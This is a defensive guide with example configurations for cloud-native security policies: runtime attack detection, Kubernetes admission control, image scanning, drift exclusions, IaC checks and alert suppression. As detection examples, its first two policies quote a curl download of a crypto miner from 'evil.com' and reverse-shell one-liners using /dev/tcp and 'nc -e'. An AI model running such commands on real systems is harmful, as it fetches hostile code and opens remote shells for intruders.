# 🛡️ CNAPP Rules & Policies — Practical Examples (2-3 Per Category)

> **Purpose:** Understand exactly what policies look like, what they do, and how you
> configure them in CrowdStrike Falcon / Wiz / Prisma Cloud.

---

# 1. INDICATORS OF ATTACK (IOA) POLICIES

> **What:** Behavioral detection rules that fire when a workload does something suspicious at runtime.
> **Your job:** Enable the right rules, set severity, and tune them to reduce noise.

### Policy 1: Container Drift Detection — CRITICAL

```
POLICY NAME:        Container Drift – Block New Executables
ASSIGNED TO:        Host Group: "All Production EKS Clusters"
ACTION:             DETECT + PREVENT (kills the new process)

WHAT IT DOES:
├── Monitors every running container for NEW binaries that were NOT
│   in the original container image
├── If a process that didn't exist at container start is executed → ALERT
├── If PREVENT is enabled → Falcon kills the process immediately

EXAMPLE TRIGGER:
├── Container starts with nginx:1.25 image
├── Attacker runs: curl http://evil.com/miner -o /tmp/xmrig && chmod +x /tmp/xmrig
├── /tmp/xmrig was NOT in the original image → DRIFT DETECTED
├── Falcon kills xmrig process before it runs
└── Alert: "ContainerDrift.NewExecutable" — Severity: CRITICAL

CONFIGURATION STEPS:
1. Cloud Security → Rules and Policies → Policies → IOA Policies
2. Select or create policy group: "Production Runtime"
3. Enable rule: "Container Drift – Executable"
4. Set action: Detect + Prevent
5. Assign to Host Group: "prod-eks-nodes"

EXCLUSIONS (if needed):
├── Some Java apps download plugins at startup → add exclusion:
│   Image: *java-dynamic-loader*
│   Path: /opt/plugins/*.jar
│   Justification: "App dynamically loads JAR plugins at startup"
│   Expiry: 90 days
│   Reviewer: security-team@company.com
```

### Policy 2: Reverse Shell Detection — CRITICAL

```
POLICY NAME:        Reverse Shell Detection – All Environments
ASSIGNED TO:        Host Group: "All Kubernetes Nodes"
ACTION:             DETECT + PREVENT

WHAT IT DOES:
├── Detects outbound shell connections (bash/sh/zsh)
│   connecting to external IPs on common C2 ports
├── Recognizes patterns:
│   ├── bash -i >& /dev/tcp/attacker-ip/4444 0>&1
│   ├── python -c 'import socket; ...'
│   ├── nc -e /bin/sh attacker-ip 4444
│   └── socat connection to external IP with shell
├── PREVENT mode: terminates the process

EXAMPLE TRIGGER:
├── Attacker exploits Java RCE (Log4Shell-like)
├── Runs: /bin/bash -i >& /dev/tcp/45.33.xx.xx/9001 0>&1
├── Falcon detects: known reverse shell pattern + external destination
├── Process killed, alert fired
└── Alert: "ReverseShellDetected" — Severity: CRITICAL

WHY ALWAYS PREVENT:
├── Reverse shells are 99% true positive
├── There is NO legitimate business reason for a production container
│   to open an outbound interactive shell to a random IP
└── Even if somehow FP — the cost of blocking is zero vs the cost
    of allowing is catastrophic
```

### Policy 3: Interactive Container Session — HIGH (Alert Only)

```
POLICY NAME:        Interactive Shell in Production Containers
ASSIGNED TO:        Host Group: "Production Nodes Only"
ACTION:             DETECT ONLY (alert, do not block)

WHAT IT DOES:
├── Detects when a TTY (interactive terminal) is opened inside
│   a running production container
├── Triggered by: kubectl exec -it, docker exec -it, or ECS Exec
├── Does NOT block — because authorized debugging sometimes requires this

EXAMPLE TRIGGER:
├── Engineer runs: kubectl exec -it api-pod-xyz -n payments -- /bin/bash
├── Falcon detects: TTY allocated inside production container
├── Alert: "InteractiveContainerSession" — Severity: HIGH
└── Security team reviews: Was this authorized? During change window?

WHY ALERT-ONLY (NOT PREVENT):
├── Sometimes on-call engineers need to debug production issues
├── But every exec should be logged, reviewed, and justified
├── If unauthorized → investigate as potential compromise
├── Pair with: K8s audit log (who ran the exec command, from which IP)

TUNING:
├── Suppress for: falcon-system namespace (sensor maintenance)
├── Suppress for: monitoring namespace (Prometheus debugging tools)
├── Do NOT suppress for: payments, customer-data, or PII namespaces
```

---

# 2. ADMISSION CONTROL (KAC) POLICIES

> **What:** Policies that intercept pod creation and BLOCK non-compliant deployments.
> **Your job:** Create rules, assign to clusters, start in Alert mode, graduate to Prevent.

### Policy 1: Block Privileged Containers

```
POLICY NAME:        Deny Privileged Containers
ASSIGNED TO:        Cluster Group: "All Production Clusters"
SCOPE:              All namespaces EXCEPT: kube-system, falcon-system, monitoring

RULE CONFIGURATION:
├── Type: IOM Rule (Indicator of Misconfiguration)
├── Check: Container securityContext.privileged == true
├── Action: PREVENT (block the deployment)
├── Message to developer:
│   "❌ Deployment rejected: privileged containers are not allowed in
│    production. Remove 'privileged: true' from your pod spec.
│    If you need specific kernel access, use 'capabilities.add'
│    with only the required capability (e.g., NET_ADMIN).
│    Exception process: submit request at security-portal/exceptions"

WHAT HAPPENS WHEN TRIGGERED:
├── Developer runs: kubectl apply -f deployment.yaml
│   (deployment has privileged: true)
├── KAC webhook intercepts the request
├── Evaluates against this policy → VIOLATION
├── Returns error to kubectl:
│   "Error from server: admission webhook 'kac.crowdstrike.com' denied
│    the request: privileged containers are not allowed [Policy: Deny-Priv]"
├── Pod is NOT created
└── Event logged in Falcon console: IOMs → Admission Control Events

EXCEPTIONS:
├── falcon-system namespace → Falcon sensor needs privileged (allowed)
├── kube-system namespace → CNI plugins may need privileged (allowed)
├── Everything else → BLOCKED
└── If a team needs an exception → formal review + time-limited bypass
```

### Policy 2: Block Unscanned Images

```
POLICY NAME:        Require Image Assessment Before Deploy
ASSIGNED TO:        Cluster Group: "All Clusters (Prod + Staging)"
SCOPE:              All namespaces except: kube-system

RULE CONFIGURATION:
├── Type: Image Assessment Rule
├── Check: Has this image been scanned by Falcon?
├── Criteria:
│   ├── Image must have a completed scan (not pending)
│   ├── Image must NOT have any Critical CVEs
│   ├── Image must NOT contain detected malware
│   └── Image must be from an approved registry (ECR only, not Docker Hub)
├── Action: PREVENT
├── Message:
│   "❌ Deployment rejected: image 'nginx:latest' has not been scanned
│    or contains Critical vulnerabilities.
│    Push your image to ECR (123456.dkr.ecr.us-east-1.amazonaws.com)
│    and wait for scan completion before deploying."

WHAT HAPPENS WHEN TRIGGERED:
├── Developer deploys with image: docker.io/library/nginx:latest
├── KAC checks: Is this image in Falcon's scan database?
│   → NO (public Docker Hub image, not scanned)
├── KAC blocks deployment
├── Developer must:
│   1. Pull image locally
│   2. Push to private ECR
│   3. ECR triggers Falcon scan automatically
│   4. Wait for scan to complete (2-5 minutes)
│   5. If no Critical CVEs → deploy using ECR image URI
│   6. If Critical CVEs → fix first, then deploy
```

### Policy 3: Enforce Security Context Requirements

```
POLICY NAME:        Enforce Pod Security Baseline
ASSIGNED TO:        Cluster Group: "All Production Clusters"
SCOPE:              All namespaces except: kube-system, falcon-system
MODE:               Week 1-2: ALERT → Week 3+: PREVENT

RULES (multiple checks in one policy):
├── Rule A: runAsNonRoot must be true
│   ├── Check: securityContext.runAsNonRoot == true
│   └── Message: "Containers must not run as root. Set runAsNonRoot: true"
│
├── Rule B: readOnlyRootFilesystem must be true
│   ├── Check: securityContext.readOnlyRootFilesystem == true
│   └── Message: "Root filesystem must be read-only. Use emptyDir for writes"
│
├── Rule C: capabilities must drop ALL
│   ├── Check: securityContext.capabilities.drop contains "ALL"
│   └── Message: "Drop all capabilities. Add back only what you need"
│
├── Rule D: hostNetwork must be false
│   ├── Check: spec.hostNetwork != true
│   └── Message: "hostNetwork is not allowed. Use Services for networking"
│
└── Rule E: hostPID must be false
    ├── Check: spec.hostPID != true
    └── Message: "hostPID is not allowed. Only system components may use this"

ROLLOUT STRATEGY:
├── Week 1: Deploy in ALERT mode
│   └── See how many existing deployments would be blocked
├── Week 2: Work with teams to fix their manifests
│   └── Provide them the exact YAML changes needed
├── Week 3: Switch Rules A,D,E to PREVENT (most critical)
├── Week 4: Switch Rules B,C to PREVENT
└── Ongoing: Monitor for exceptions, review quarterly
```

---

# 3. IMAGE ASSESSMENT POLICIES

> **What:** Rules that define what makes a container image "pass" or "fail" scanning.
> **Your job:** Set thresholds that balance security with operational reality.

### Policy 1: Production Image Standards

```
POLICY NAME:        Production Image Security Standards
APPLIED TO:         Registry: 123456.dkr.ecr.us-east-1.amazonaws.com
SCAN TRIGGER:       On every image push to ECR

THRESHOLDS:
├── FAIL (Block deployment via KAC):
│   ├── Any Critical CVE with a fix available
│   ├── Any malware detected
│   ├── Any hardcoded secret/credential in image layers
│   └── Image older than 90 days since last rebuild
│
├── WARN (Alert but allow):
│   ├── High CVEs (up to 5 allowed, must have remediation plan)
│   ├── Dockerfile best practice violations:
│   │   ├── Running as root (no USER instruction)
│   │   ├── Using :latest tag
│   │   └── No HEALTHCHECK defined
│   └── Medium/Low CVEs (for tracking, not blocking)
│
└── PASS:
    └── Zero Critical CVEs, zero malware, zero secrets

EXAMPLE SCAN RESULT:
┌────────────────────────────────────────────┐
│ IMAGE: app-api:v2.3.1                       │
│ REGISTRY: 123456.dkr.ecr.us-east-1         │
│ SCANNED: 2025-03-15 06:00 UTC               │
│                                              │
│ CRITICAL: 1 (CVE-2024-21626 - runc escape)  │
│ HIGH:     3                                  │
│ MEDIUM:   8                                  │
│ LOW:      12                                 │
│ MALWARE:  0                                  │
│ SECRETS:  0                                  │
│                                              │
│ VERDICT: ❌ FAIL                             │
│ REASON: Critical CVE with fix available      │
│ FIX: Update runc to >= 1.1.12               │
└────────────────────────────────────────────┘
```

### Policy 2: Development/Staging Relaxed Standards

```
POLICY NAME:        Dev/Staging Image Standards
APPLIED TO:         Registry: 123456.dkr.ecr.us-east-1.amazonaws.com/dev/*
SCAN TRIGGER:       On push

THRESHOLDS:
├── FAIL:
│   ├── Malware detected (no exceptions for malware, ever)
│   ├── Hardcoded AWS access keys or passwords
│   └── Known exploit kit signatures
│
├── WARN:
│   ├── Critical CVEs (warn but don't block — devs need to iterate)
│   ├── High CVEs
│   └── Dockerfile violations
│
└── PASS:
    └── Everything else

WHY RELAXED:
├── Dev environments need faster iteration
├── Blocking every Critical CVE in dev slows development
├── BUT: malware and secrets are NEVER acceptable — even in dev
└── Policy ensures: devs are AWARE of vulns but not blocked from coding
```

---

# 4. CONTAINER DRIFT EXCLUSIONS

> **What:** Exceptions for legitimate post-start file writes that trigger drift alerts.
> **Your job:** Create narrow exclusions with documentation, expiry, and review.

### Exclusion 1: Java Application — Dynamic JAR Loading

```
EXCLUSION NAME:     Java Plugin Loader – Dynamic JARs
SCOPE:
├── Image: 123456.dkr.ecr.*/java-service:*
├── Namespace: backend
├── Path: /opt/app/plugins/*.jar
JUSTIFICATION:
│   "The java-service application uses a plugin architecture that
│    downloads configuration JAR files from S3 at startup. These
│    JARs are not in the original image but are legitimate application
│    behavior. Verified with AppDev team lead (Jane Smith) on 2025-01-15."
EXPIRY:             2025-04-15 (90 days)
REVIEWER:           security-analyst@company.com
NEXT REVIEW:        2025-04-01

⚠️ RISK NOTES:
├── This exclusion only covers .jar files in /opt/app/plugins/
├── Any executable (.sh, .py, .elf) in this path is NOT excluded
├── Any drift OUTSIDE this path is NOT excluded
└── If the app architecture changes, this exclusion must be re-evaluated
```

### Exclusion 2: Log Rotation Agent — Creates New Log Files

```
EXCLUSION NAME:     Fluentd Log Rotation Files
SCOPE:
├── Image: fluent/fluentd:v1.16*
├── Namespace: logging
├── Path: /var/log/fluentd/buffer/*
JUSTIFICATION:
│   "Fluentd creates buffer files in /var/log/fluentd/buffer/ as part
│    of normal log forwarding. These files are written post-start and
│    trigger drift alerts. This is expected for any log aggregation sidecar."
EXPIRY:             2025-06-15 (90 days)
REVIEWER:           platform-team@company.com

⚠️ RISK NOTES:
├── Only buffer files (*.log, *.buf) are excluded
├── Any EXECUTABLE in this path would still trigger an alert
└── If Fluentd is replaced with another log agent, remove this exclusion
```

### Exclusion 3: Temporary Build Artifacts in CI/CD Runner

```
EXCLUSION NAME:     GitLab Runner – Build Artifacts
SCOPE:
├── Image: gitlab/gitlab-runner:*
├── Namespace: ci-cd
├── Path: /builds/**
JUSTIFICATION:
│   "GitLab Runner containers clone repositories and build artifacts
│    inside /builds/. These are new files that trigger drift detection.
│    This is a fundamental part of CI/CD and must be excluded."
EXPIRY:             2025-05-01 (90 days)
REVIEWER:           devops-lead@company.com

⚠️ RISK NOTES:
├── CI/CD runners are high-value targets for supply chain attacks
├── Even with this exclusion, REVERSE SHELL and CRYPTO MINING
│   detections are NOT excluded (those are IOA, not drift)
├── Monitor CI/CD namespace with enhanced logging
└── Restrict runner to limited IAM role (no production S3/RDS access)
```

---

# 5. CLOUD RISKS / IOM RULES / IaC RULES

> **What:** Customize which cloud misconfigurations to check, their severity, and whether to enable/disable specific checks.

### Policy 1: Critical Cloud Risks — Financial Org

```
POLICY NAME:        Financial Org – Critical Cloud Risks
APPLIES TO:         All registered AWS/Azure/GCP accounts

CUSTOMIZED RULES (severity overrides):

│ DEFAULT RULE                          │ OUR CUSTOM SEVERITY │ WHY           │
│──────────────────────────────────────│────────────────────│──────────────│
│ S3 bucket is publicly accessible      │ 🔴 CRITICAL (was H) │ PCI/GLBA      │
│ RDS instance is publicly accessible   │ 🔴 CRITICAL (was H) │ SOX/PCI       │
│ Security Group allows 0.0.0.0/0 SSH   │ 🔴 CRITICAL          │ CIS 5.1       │
│ Root account has access keys          │ 🔴 CRITICAL          │ CIS 1.4       │
│ CloudTrail not enabled in all regions │ 🔴 CRITICAL (was M) │ NYDFS/SOX     │
│ IAM user without MFA                  │ 🔴 CRITICAL (was H) │ NYDFS mandate │
│ EBS volume unencrypted                │ 🟠 HIGH              │ PCI Req 3     │
│ S3 bucket without versioning          │ 🟡 MEDIUM            │ Best practice │
│ Tag compliance (missing "Owner" tag)  │ 🟡 MEDIUM            │ Governance    │

DISABLED RULES (not applicable to our environment):
├── "GCP Dataflow not using Customer-Managed Keys" → We don't use GCP Dataflow
├── "Azure DevOps variable groups not restricted" → We use GitHub, not ADO
└── Justification documented for every disabled rule
```

### Policy 2: IaC Scanning Rules — Terraform

```
POLICY NAME:        Terraform IaC Security Standards
APPLIES TO:         All CI/CD pipelines running Terraform
SCANNER:            Checkov / KICS / Falcon IaC

RULES ENFORCED (build-breaking):
├── CKV_AWS_145: "Ensure S3 bucket has server-side encryption"
│   → terraform plan shows: aws_s3_bucket without server_side_encryption
│   → Build FAILS with message:
│     "All S3 buckets must have SSE enabled. Add:
│      server_side_encryption_configuration { ... }"
│
├── CKV_AWS_24: "Ensure no SG allows ingress from 0.0.0.0/0 to port 22"
│   → terraform plan shows: aws_security_group_rule with cidr 0.0.0.0/0 port 22
│   → Build FAILS
│
├── CKV_AWS_18: "Ensure S3 bucket has access logging enabled"
│   → Build FAILS if logging not configured
│
├── CKV_K8S_1: "Ensure privileged containers are not used"
│   → Kubernetes manifests in the repo with privileged=true → FAIL

RULES AS WARNINGS (logged but don't break build):
├── CKV_AWS_79: "Ensure IMDSv2 is required" → WARN (migrating gradually)
├── CKV_AWS_130: "Ensure VPC subnets don't auto-assign public IPs" → WARN
└── CKV_K8S_8: "Ensure readOnlyRootFilesystem is true" → WARN

EXCEPTION HANDLING:
├── Developer adds inline skip: # checkov:skip=CKV_AWS_145: "Using SSE-S3 default"
├── Security team reviews skip justification in PR review
├── Unjustified skips are rejected in PR
└── All skips tracked in monthly compliance report
```

---

# 6. SUPPRESSION RULES

> **What:** Rules that silence KNOWN false positives so analysts don't waste time on noise.
> **Your job:** Create each with documentation, narrow scope, expiry, and reviewer.

### Suppression 1: Health Check Triggers Network Alert

```
SUPPRESSION NAME:     Health Check HTTP Connections – Prometheus
DETECTION SUPPRESSED: SuspiciousNetworkConnection
SCOPE:
├── Source Image: prom/prometheus:*
├── Source Namespace: monitoring
├── Destination: internal IPs only (10.0.0.0/8)
├── Destination Port: 9090, 9100, 8080
JUSTIFICATION:
│   "Prometheus scrapes /metrics endpoints on all pods every 15 seconds.
│    These outbound HTTP connections are legitimate monitoring traffic
│    and consistently trigger SuspiciousNetworkConnection alerts.
│    Scoped to internal IPs only — external connections are NOT suppressed."
CREATED:              2025-01-15
EXPIRY:               2025-04-15 (90 days)
REVIEWER:             security-analyst@company.com
QUARTERLY REVIEW:     2025-04-01

⚠️ SAFETY CHECKS:
├── Suppression does NOT cover external IP destinations
├── If Prometheus connects to a non-internal IP → alert FIRES normally
├── If Prometheus image is updated to a non-prom/* image → alert FIRES
└── Periodically verify: is Prometheus still deployed in this namespace?
```

### Suppression 2: CI/CD Runner Shell Spawning

```
SUPPRESSION NAME:     GitLab Runner – Expected Shell Execution
DETECTION SUPPRESSED: SuspiciousProcessExecution
SCOPE:
├── Image: gitlab/gitlab-runner:*
├── Namespace: ci-cd
├── Process: /bin/bash, /bin/sh
├── Parent Process: gitlab-runner
JUSTIFICATION:
│   "GitLab Runner's primary function is to execute build scripts,
│    which inherently involves spawning shell processes. The runner's
│    bash/sh execution is expected behavior. Suppression is scoped
│    to shells spawned only by the gitlab-runner parent process."
CREATED:              2025-02-01
EXPIRY:               2025-05-01 (90 days)
REVIEWER:             devops-lead@company.com

⚠️ SAFETY CHECKS:
├── OTHER detections (reverse shell, crypto mining, drift) are NOT suppressed
├── If the parent process is NOT gitlab-runner → alert fires normally
├── If shell is spawned in a DIFFERENT namespace → alert fires normally
└── CI/CD runners should have limited IAM — monitor for privilege escalation
```

### Suppression 3: Init Container DNS Resolution Burst

```
SUPPRESSION NAME:     Init Container DNS Burst – Vault Agent
DETECTION SUPPRESSED: SuspiciousDNSRequest (volume-based)
SCOPE:
├── Image: hashicorp/vault-agent:*
├── Namespace: *
├── Detection sub-type: "High volume DNS queries"
├── Destination: internal DNS (kube-dns, CoreDNS)
JUSTIFICATION:
│   "Vault Agent init containers resolve the Vault server address
│    repeatedly during startup (retry logic with exponential backoff).
│    This generates 50-100 DNS queries in 30 seconds, triggering
│    the 'High volume DNS' sub-detection. The queries are to internal
│    DNS only and resolve vault.vault-system.svc.cluster.local."
CREATED:              2025-02-15
EXPIRY:               2025-05-15 (90 days)
REVIEWER:             platform-engineering@company.com

⚠️ SAFETY CHECKS:
├── Only DNS tunneling pattern to EXTERNAL domains would be suppressed
│   (it is NOT — this only covers internal DNS volume)
├── If Vault Agent resolves an EXTERNAL domain → alert fires
└── If DNS query contains encoded data (tunneling) → alert fires
```

---

# 📋 POLICY GOVERNANCE CHECKLIST

```
MONTHLY:
☐ Review all active suppression rules (any expired?)
☐ Check KAC alert-mode policies: ready to upgrade to prevent?
☐ Review IOA detection rates: any rule with <50% TP rate?
☐ Count total suppression rules: is the number growing too fast?

QUARTERLY:
☐ All 90-day suppressions re-evaluated (renew, modify, or remove)
☐ All drift exclusions re-validated with application teams
☐ KAC policy coverage: are new clusters assigned to policies?
☐ IaC scanning: are new Terraform modules covered?
☐ Report to governance: total policies, suppressions, exceptions, trends

ANNUALLY:
☐ Full policy review with security leadership
☐ Align policies with latest CIS benchmark versions
☐ Update image assessment thresholds if industry standards changed
☐ Sunset deprecated rules for decommissioned applications
```
